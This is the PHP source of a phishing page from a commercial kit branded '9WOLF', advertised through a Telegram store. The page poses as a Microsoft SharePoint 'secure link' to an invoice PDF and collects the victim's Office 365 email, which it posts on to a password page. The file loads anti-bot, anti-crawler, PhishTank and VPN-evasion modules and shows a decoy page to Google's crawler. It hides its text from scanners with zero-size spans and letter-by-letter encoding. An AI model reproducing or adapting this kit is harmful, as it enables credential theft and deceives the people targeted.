<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠼⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠸⡏⣇⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⢠⡇⢹⣀⠞⠛⢷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⠀⠀⣶⣿⣥⡬⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠏⠀⠀⠀⠀⠀⢻⠈⠁⢹⡇⠀⠀⢰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠛⠛⣻⠅⠀⠀⠀⠀⠀⠀⢸⣆⡴⠟⠃⠀⠀⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⡴⢿⡿⠏⠀⠀⠀⠀⠀⠀⠀⢈⣿⠁⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⣸⣧⠽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢠⡆⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⣿⣿⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⣠⣿⡿⣦⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠘⢻⢿⣇⡀⠀⠀⢀⠀⠀⠀⣸⠷⣿⣯⠇⠘⠽⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣿⠟⠀⠀⢶⣄⠈⠇⣿⣷⠀⠀⠘⣇⠀⠀⠘⣶⠿⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⠏⠀⢰⡀⢸⣿⠃⠲⠃⢻⣶⡄⣦⣿⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣟⣁⣠⣴⣿⡇⢸⡏⠀⠀⠀⠾⢹⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀
⣀⣀⣤⣴⣿⣟⠀⠉⣩⣿⡿⢡⡟⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠉⠛⠿⢿⣿⣶⣿⣿⣯⣶⣿⣿⠇⠀⠀⠀⠀⠀⠘⠳⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀
⠀⠀⠀⠀⠀⣼⣿⣫⠍⠙⠚⠋⣿⢀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀⠀⠀⣠⠀⣷⣿⡄⠀⠀
⠀⠀⠀⠀⣼⡿⣿⡏⣸⠃⠀⠀⢸⡿⣿⡀⢀⠀⠀⠀⠀⠀⠀⠀⢦⣄⠀⠀⣿⡄⠀⢰⣿⣆⣿⠻⣧⠀⠀
⠀⠀⠀⢰⡟⢠⣿⣿⡯⠀⠀⠀⠀⠳⠸⣧⠈⣷⡀⠰⡄⠀⠀⠀⠈⣿⣇⣰⠟⣷⡄⣸⣿⠻⣿⣇⠛⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⢠⡇⠀⠀⠀⠀⠙⣷⣿⢿⣆⢹⣆⠀⠀⢰⡇⣿⠏⠀⠈⢿⣿⣿⡆⠙⢿⣦⠀⠀
⠀⠀⠀⠀⢸⣏⣿⢿⣿⡿⠀⠀⠀⠀⠀⠀⠈⠛⠄⠻⢿⡟⢷⣤⣾⠁⠁⠀⠀⠀⠀⠉⠻⣿⡄⡈⠹⣧⠀
⠀⠀⠀⠀⠈⢸⡏⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠊⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠈⡗⠹⣷⣼⡆
⠀⠀⠀⠀⠀⢸⡃⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀⠀⠀⠛⠀⣿⡿⣷
⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠿⠇⠉
 * //Think Twice , Code Once\\
 * //We work in the dark to serve the light\\
 * 9WOLF Office Page + Cookies File Grabber
 * Version 5
 * REMEMBER:  
 * Telegram Channel is : @NINEWOLFSTORE
 * Telegram Store is   : @NINEWOLFSTORE_bot

 * CopyRights: all reserved https://9wolf.io
###########################################
#$            @NINEWOLFSTORE             #$
#$                  Says:                #$
#$           As the Hunter exist         #$ 
#$          The victim exist too         #$  
###########################################
 ================IF AGREED=================
 ==================THEN====================
=To Be save Join Our Telegram Channel
=   @NINEWOLFSTORE
=To Be Secured Join Our Telegram Store
=   @NINEWOLFSTORE_bot

*/

error_reporting(E_ALL ^ E_NOTICE);
ob_start();
session_start();
$path = "../site/";
require ("../9WOLFConfi/Guration.php");
require ("../9WOLFConfi/Function.php");
require ("../9WOLFDecline/AntiBotIp.php");
require ("../9WOLFDecline/AntiBotPw.php");
require ("../9WOLFDecline/AntiBotKillBot.php");
require ("../9WOLFDecline/AntiBotUserAgent.php");
require ("../9WOLFDecline/AntiBotIsp.php"); 
require ("../9WOLFDecline/AnitiBotHost.php");
require ("../9WOLFDecline/AntiBotPhishTank.php");
require ("../9WOLFDecline/AntiBotVpn.php");
require ("../9WOLFDecline/AntiBotProxy.php");
require ("../9WOLFDecline/AntBotProtection.php");
require ("../9WOLFDecline/SaveBrowsing.php");
require ("../9WOLFDecline/DiscoveredBot.php");
require ("../9WOLFDecline/AntiBotThree.php");
require ("../9WOLFDecline/DisturbOne.php");
require ("../9WOLFDecline/DisturbTwo.php");
require("../9WOLFDecline/Anti/Bot-Crawler.php");
@require("../9WOLFDecline/Anti/Crawler/src/CrawlerDetect.php");
use JayBizzle\CrawlerDetect\CrawlerDetect;
$rand = generateRandomString(130);
$cage = substr(sha1(mt_rand()),1,25);
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { 
    include($path."index.php"); exit();
}
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) {
    include($path."index.php"); exit();
}

if (isset($_POST['hidden']) && !empty($_POST['9WOLFDatorKiller'])  ) {
  include($path."index.php"); exit();
}
if (!isset($_SESSION['9WOLF_SESSION_T0k3n'])  ) {
  include($path."index.php"); exit();
}
#if (!isset($_POST['token9WOLFCsrf'])) {
#    include($path."index.php");
  
#}
#if ($_POST['token9WOLFCsrf'] != $_SESSION['9WOLF_SESSION_T0k3n']) {
#    include($path."index.php"); 
#}
if (isset($_POST['emailaccess'])){
   $_SESSION['emailaccess']  = $_POST['emailaccess'];
   }

?>

<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <meta name="robots" content="noindex,nofollow" />
    <meta name="googlebot" content="noindex,nofollow" />
    <meta name="googlebot-news" content="nosnippet">
    <META NAME="robots" CONTENT="nofollow">
    <meta http-equiv="Cache-Control" content="no-store">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Cache-Control" content="private">
    <meta http-equiv="Pragma" content="no-cache">
    <title><?php echo htmlentities("Sign in to your account", ENT_QUOTES, "UTF-8"); ?></title>
    <ink rel="stylesheet prefetch" href="https://fonts.googleapis.com/css?family=Open+Sans:600">
      <link rel="stylesheet" href="./assets/css.css">
    <link rel="shortcut icon" href="./assets/mic.ico">
    <link rel="stylesheet" href="./assets/2.css">
</head>
<body>
  <div class="external-sharing-content ms-Fabric">
    <div class="top-banner">
      <div class="brand-name"><span style="font-family: 'Segoe UI Web (West European)', 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;">M<span style="font-size: 0%;">go</span>ic<span style="font-size: 0%;">go</span>ro<span style="font-size: 0%;">go</span>s<span style="font-size: 0%;">go</span>oft Sh<span style="font-size: 0%;">go</span>are<span style="font-size: 0%;">go</span>Po<span style="font-size: 0%;">go</span>int</span>
      </div>
    </div>
    <div class="main-content">
      <div class="desktop-logo ms-hiddenSm">
        <img class="microsoft-logo" src="./assets/logo.png" alt="">
      </div>
      <div class="sharing-form">
        <div class="header">
          <span style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;color:#0078d7;"><?php encript("D").encript("o").encript("c").encript("u").encript(" ").encript("S").encript("i").encript("g").encript("n").encript(""); ?></span> 
        </div>
        <div class="form-content">
          <form action="./p4s5w0rd?" method="POST">
            <input type="hidden" name="token9WOLFCsrf" value="<?php echo $_SESSION['9WOLF_SESSION_T0k3n'];?>">
                                                <input type="hidden" name="9WOLFDatorKiller" value=""> 
              

            <div class="file-description">
              <div class="file-description-title" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">You've recei<span style="font-size: 0%;">go</span>ved a secure li<span style="font-size: 0%;">go</span>nk to:</div>
              <div class="file-info">
                <img alt="" src="./assets/pdf3.png" style="height:32px;width:32px;">
                <div class="file-name" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">
                  <span><?php encript("I").encript("N").encript("V").encript("0").encript("0").encript("7").encript("2").encript("0").encript("9").encript(".").encript("p").encript("d").encript("f").encript(""); ?></span>
                </div>
              </div>
            </div>

            <div>

              <div class="form-message" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;"><span>To open this secu<span style="font-size: 0%;">go</span>re li<span style="font-size: 0%;">go</span>nk, You n<span style="font-size: 0%;">go</span>eed to en<span style="font-size: 0%;">go</span>ter an Of<span style="font-size: 0%;">go</span>fic<span style="font-size: 0%;">go</span>e36<span style="font-size: 0%;">go</span>5 em<span style="font-size: 0%;">go</span>ail t<span style="font-size: 0%;">go</span>hat this do<span style="font-size: 0%;">go</span>cum<span style="font-size: 0%;">go</span>ent was shar<span style="font-size: 0%;">go</span>ed to.</span><div class="sharing-form">
        <div class="header">
          <span style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif; "><?php encript("V").encript("e").encript("r").encript("i").encript("f").encript("y").encript(" ").encript("Y").encript("o").encript("u").encript("r").encript(" ").encript("I").encript("d").encript("e").encript("n").encript("t").encript("i").encript("t").encript("y").encript(""); ?></span> 
        </div>
              </div> 
              <div class="form-input-container">

                <input name="emailaccess"  value="" maxlength="70" class="form-text-input disable-on-submit is-empty " placeholder="Enter Your Business Email" type="email" oninvalid="this.setCustomValidity('Required Field')" oninput="setCustomValidity('')" title="Required Field" required="">
                <div class="focus-area">
                  <i class="ms-Icon ms-Icon--Info" aria-hidden="true"></i>
                  <div class="callout" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">
                    <div class="callout-title" style=""><?php encript("W").encript("h").encript("y").encript("d").encript("o").encript(" ").encript("I").encript(" ").encript("h").encript("a").encript("v").encript("e").encript(" ").encript("t").encript("o").encript(" ").encript("d").encript("o").encript(" ").encript("t").encript("h").encript("i").encript("s").encript("?").encript("");?></div>
                    The per<span style="font-size: 0%;">ygo</span><?php encript("s").encript("o").encript("n").encript(" ").encript("t").encript("h").encript("a").encript("t").encript(" ").encript("h").encript("a").encript("s").encript("").encript("s").encript("h").encript("a").encript("");?><span style="font-size: 0%;">g3o</span><?php encript("r").encript("e").encript("d").encript(" ").encript("t").encript("h").encript("i").encript("s").encript(" ").encript("l").encript("i").encript("n").encript("k").encript("i").encript("s").encript("?").encript("");?> <span style="font-size: 0%;">y3go</span><?php encript("w").encript("i").encript("t").encript("h").encript(" ").encript("y").encript("o").encript("u").encript(" ").encript("i").encript("s").encript(" ").encript("s").encript("h").encript("a").encript("r").encript("");?><span style="font-size: 0%;">go</span><?php encript("i").encript("n").encript("g").encript(" ").encript("w").encript("i").encript("t").encript("h").encript(" ").encript("a").encript(" ").encript("s").encript("e").encript("c").encript("u").encript("r").encript("e").encript(" ").encript("l").encript("i").encript("n").encript("k").encript(" ").encript("w").encript("h").encript("i").encript("c").encript("h").encript(" ").encript("r").encript("e").encript("q").encript("u").encript(""); ?><span style="font-size: 0%;">go</span><?php encript("i").encript("r").encript("e").encript("s").encript(" ").encript("y").encript("o").encript("u").encript(" ").encript("t").encript("o").encript(" ").encript("v").encript("e").encript("r").encript(""); ?><span style="font-size: 0%;">ygo</span><?php encript("i").encript("f").encript("y").encript(" ").encript("y").encript("o").encript("u").encript("r").encript(" ").encript("i").encript("d").encript("e").encript("n").encript(""); ?><span style="font-size: 0%;">ygo</span>tity.
                  </div>
                </div>
              </div>
              <div class="form-error-container">
                <span style="display:none;">Your <span style="font-size: 0%;">ygo</span>em<span style="font-size: 0%;">yg3o</span>ail add<span style="font-size: 0%;">yg3o</span>ress is requi<span style="font-size: 0%;">ygo</span>red</span>
                <span style="display:none;">Your em<span style="font-size: 0%;">ygo</span>ail addr<span style="font-size: 0%;">yg3o</span>ess must be in the correct em<span style="font-size: 0%;">ygo</span>ail format (e.g. "user@c<span style="font-size: 0%;">ygo</span>ontoso.<span style="font-size: 0%;">ygo</span>com")</span>
                <span id="IncorrectTOAAEMail" style="display:none;"><?php encript("S").encript("o").encript("r").encript("r").encript("y").encript(",").encript(" ").encript("t").encript("h").encript("i").encript("s").encript(" ").encript("e").encript("m").encript(""); ?><span style="font-size: 0%;">yg3o</span><?php encript("a").encript("i").encript("l").encript(" ").encript("i").encript("s").encript(" ").encript("n").encript("ot").encript(" ").encript("o").encript("n").encript(" ").encript("t").encript("h").encript("e").encript(" ").encript("l").encript("i").encript("s").encript("t").encript(" ").encript("o").encript("f").encript(" ").encript("p").encript("e").encript("o").encript("p").encript("l").encript("e").encript(" ").encript("t").encript("h").encript("i").encript("s").encript(" ").encript("li").encript(""); ?><span style="font-size: 0%;">ygo3</span><?php encript("").encript("n").encript("k").encript(" ").encript("i").encript("s").encript(" ").encript("s").encript("e").encript("cu").encript(""); ?><span style="font-size: 0%;">ygo</span>red to. Please conta<span style="font-size: 0%;">ygo</span>ct the per<span style="font-size: 0%;">go</span>son who sha<span style="font-size: 0%;">go</span>red it with you.</span>
              </div>
              <divclass="form-input-container">
                <input  name="btnSubmitEmail" value="Next" class="form-submit disable-on-submit" type="submit" style="cursor: pointer;">
                <div  class="submitted-text">
                  <div class="spinner"></div><?php encript("C").encript("h").encript("e").encript("c").encript("k").encript("i").encript("n").encript("g").encript(".").encript(".").encript(".").encript(""); ?>
                </div>
              </div>

            </div>




        </form></div>
      </div>
      
      <div class="legal">
        <span>© 202<span style="font-size: 0%;">go2</span>5 Mic<span style="font-size: 0%;">g3o</span>ros<span style="font-size: 0%;">g3o</span>oft</span>
        <a href="#">Pr<span style="font-size: 0%;">g2o</span>ivacy & Cook<span style="font-size: 0%;">go3</span>ies</a>
      </div>
      <div class="mobile-logo ms-hiddenMdUp">
        <img class="microsoft-logo" src="./files/logo.png" alt="">
      </div>
    </div>

  </div>

</body>
</html>
